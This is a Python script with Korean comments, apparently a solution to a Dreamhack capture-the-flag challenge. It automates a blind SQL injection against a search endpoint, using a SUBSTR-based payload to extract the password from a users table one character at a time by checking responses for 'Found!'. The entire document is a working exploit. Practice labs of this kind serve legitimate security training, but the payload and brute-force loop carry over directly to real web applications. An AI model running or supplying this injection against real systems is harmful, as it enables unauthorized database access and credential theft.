import requests
import string

# 대상 URL (바뀔 수 있음)
url = "http://host3.dreamhack.games:9528/search"

# 무작위 대조를 위한 문자셋 (숫자 + 알파벳 소문자 + 대문자)
char_set = string.digits + string.ascii_letters + "_{}" 

def solve():
    password = ""
    print("[+] Start cracking the password...")

    for i in range(1, 33): # 비밀번호 길이를 모를 경우 넉넉하게 설정
        found = False
        for char in char_set:
            # Blind SQL Injection 페이로드
            # SUBSTR(password, 위치, 길이)를 사용하여 i번째 글자가 char인지 확인
            payload = f"%' AND (SELECT SUBSTR(password,{i},1) FROM users) = '{char}'--"
            
            # POST 방식으로 데이터 전송
            data = {'query': payload}
            response = requests.post(url, data=data)

            # 응답 내용에 "Found!"가 있으면 해당 문자가 맞는 것
            if "Found!" in response.text:
                password += char
                print(f"[+] Current Password: {password}")
                found = True
                break
        
        if not found:
            print(f"[!] Finished. Total Password: {password}")
            break

if __name__ == "__main__":
    solve()




















